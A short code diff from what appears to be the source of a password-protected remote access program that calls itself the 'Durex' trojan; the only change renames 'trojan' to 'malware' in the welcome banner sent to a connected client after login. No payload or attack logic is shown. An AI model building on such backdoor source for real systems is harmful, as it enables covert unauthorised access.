@@ -33,7 +33,7 @@ void		new_client(t_client *client)
 			{
 				if (compare_passwrd(buf) == true)
 				{
-					dprintf(client->socket, "Welcome to Durex trojan : \n");
+					dprintf(client->socket, "Welcome to Durex malware : \n");
 					client->token = ft_dstrjoin("secu.", strdup(buf), 2);
 					login = 1;
 				}
